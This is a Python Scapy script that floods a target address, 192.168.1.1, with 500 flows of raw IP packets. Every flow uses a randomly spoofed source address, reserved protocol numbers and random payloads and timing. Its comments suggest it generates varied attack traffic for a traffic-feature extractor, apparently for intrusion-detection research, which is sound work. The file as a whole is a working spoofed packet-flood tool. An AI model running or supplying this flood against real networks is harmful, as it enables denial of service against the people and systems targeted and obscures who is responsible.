from scapy.all import *
import random
import time

TARGET_IP = "192.168.1.1"
FLOWS = 500
MIN_PACKETS = 5
MAX_PACKETS = 30

print(f"[*] Starting Raw IP Flood -> {TARGET_IP}")
print(f"[*] Sending {FLOWS} flows x {MIN_PACKETS}-{MAX_PACKETS} packets")

for f in range(FLOWS):
    # --- Flow-level parameters (fixed for entire flow) ---
    src_ip   = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    ttl      = random.randint(32, 128)
    packets  = random.randint(MIN_PACKETS, MAX_PACKETS)

    # Per-flow protocol — rotate through unusual/reserved proto numbers
    # Avoids TCP(6), UDP(17), ICMP(1) so extractor sees it as raw IP
    proto    = random.choice([
        253, 254,   # experimentation/testing (RFC 3692)
        59,         # no next header
        63,         # any local network
        77,         # sun nd protocol
        78,         # SATNET
        143,        # Ethernet-within-IP
        253,        # experimentation
    ])

    # Per-flow IP ID base (increments per packet = realistic)
    ip_id_base = random.randint(1, 60000)

    # Per-flow payload size profile
    size_min = random.randint(20, 200)
    size_max = random.randint(size_min + 100, 1400)

    # Per-flow IAT profile
    iat_min  = random.uniform(0.0001, 0.005)
    iat_max  = random.uniform(iat_min + 0.001, 0.05)

    # Per-flow TOS (type of service) — adds feature variance
    tos      = random.choice([0, 8, 16, 24, 32, 40, 48, 56])

    for p in range(packets):
        payload_size = random.randint(size_min, size_max)
        payload      = bytes([random.randint(0, 255) for _ in range(payload_size)])

        pkt = IP(
            src   = src_ip,
            dst   = TARGET_IP,
            ttl   = ttl,
            proto = proto,                 # raw/unknown protocol — no transport layer
            id    = (ip_id_base + p) % 65535,  # incrementing ID per packet
            tos   = tos,
            flags = random.choice([0, 1, 2]),  # 0=none, 1=MF, 2=DF
        ) / Raw(load=payload)

        send(pkt, verbose=0)
        time.sleep(random.uniform(iat_min, iat_max))

    time.sleep(random.uniform(0.01, 0.05))

    if (f + 1) % 20 == 0:
        print(f"[+] {f + 1}/{FLOWS} flows sent")

print("[*] Done.")